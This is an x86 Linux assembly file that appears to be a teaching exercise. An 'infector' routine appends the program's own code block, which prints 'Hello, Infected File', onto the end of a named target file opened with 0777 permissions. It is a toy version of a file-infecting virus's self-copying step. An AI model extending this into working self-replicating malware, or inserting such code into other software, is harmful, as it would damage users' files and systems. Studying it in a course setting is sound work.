%define SYS_EXIT 1
%define SYS_READ  3
%define SYS_WRITE 4
%define SYS_OPEN 5
%define SYS_CLOSE 6
%define SYS_GETDENTS 141


%define BUFFER_SIZE 8192

%define STDIN 0
%define STDOUT 1
%define STDERR 2

%define RO 0
%define WO 1
%define RW 2
%define APPEND 1024

section .rodata
    msg: DB "Hello, Infected File", 10, 0

%define MSG_LEN 21
    
    
section .text
global _start
global system_call
global code_start
global code_end
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    mov     eax, SYS_WRITE        
    mov     ebx, STDOUT
    mov     ecx, msg        ; "Hello, Infected File"
    mov     edx, MSG_LEN    ; strlen("Hello, Infected File")
    int     0x80            ; Transfer control to operating system
    
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
    
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack - will be used for fd
    pushad                  ; Save some more caller state

    mov     eax, SYS_OPEN       ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+4+1*4]   ; Next argument...
    mov     ecx, APPEND + WO   ; Next argument...
    mov     edx, 0777           ; Next argument...
    int     0x80                ; Transfer control to operating system
    mov     [ebp-4], eax        ; fd = system_call(SYS_OPEN, filename, APPEND | WO, 0777)
    
    mov     eax, SYS_WRITE        
    mov     ebx, [ebp-4]
    mov     ecx, code_start
    mov     edx, code_end - code_start 
    int     0x80                ;system_call(SYS_WRITE, fd, code_start, code_end-code_start)
    
    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
    
    
code_end: